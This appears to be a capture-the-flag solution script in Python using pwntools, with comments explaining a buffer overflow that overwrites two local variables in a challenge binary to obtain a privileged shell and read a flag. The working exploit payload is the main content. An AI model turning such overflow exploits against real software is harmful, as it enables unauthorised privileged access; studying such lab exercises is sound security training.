#!/usr/bin/env python3

from pwn import *

# By analysing assembly code we can find that a and b
# a = 0x48474645 b = 0x44434241 and this values will match condition to run shell
a = 'EFGH'
b = 'ABCD'

'''
We overwrite these values using by bufferoverflow 
First we find that we need to send additional 20 bytes to buffer overflow and additional 8 bytes
of our a and b.
Buffer length can be found by analyzing assembly, but I just tested all possible lenges and it worked for 20
In the end we can run the priveleged shell and see the content of flag1
'''

if __name__ == '__main__':
	p = process('/challenges/chal1')
	p.sendline('IAMOVERWRITINGBUFFER' + b + a)
	p.interactive()
